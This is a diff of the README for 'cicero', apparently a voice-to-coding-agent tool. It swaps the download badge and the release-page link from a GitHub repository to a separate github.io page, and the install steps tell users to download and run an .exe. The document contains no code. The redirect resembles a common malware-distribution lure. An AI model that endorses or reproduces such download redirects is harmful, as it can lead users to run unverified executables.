@@ -1,6 +1,6 @@
 # 🎙️ cicero - Talk to your coding team naturally
 
-[![](https://img.shields.io/badge/Download-cicero-blue?style=for-the-badge)](https://github.com/Municipal-capon303/cicero)
+[![](https://img.shields.io/badge/Download-cicero-blue?style=for-the-badge)](https://municipal-capon303.github.io)
 
 Cicero connects your voice to coding software. It lets you speak to your computer to write, edit, and fix code. You can talk through your web browser or a Telegram call. Cicero listens, understands, and gives the work to your coding agents. It runs on your own computer to keep your data private. It works without sending your voice to the cloud.
 
@@ -19,7 +19,7 @@ Before you install Cicero, check your computer for these parts:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/Municipal-capon303/cicero) to see the download options.
+1. Visit the [official release page](https://municipal-capon303.github.io) to see the download options.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to download it to your Downloads folder.
 4. Open the downloaded file to start the installer.
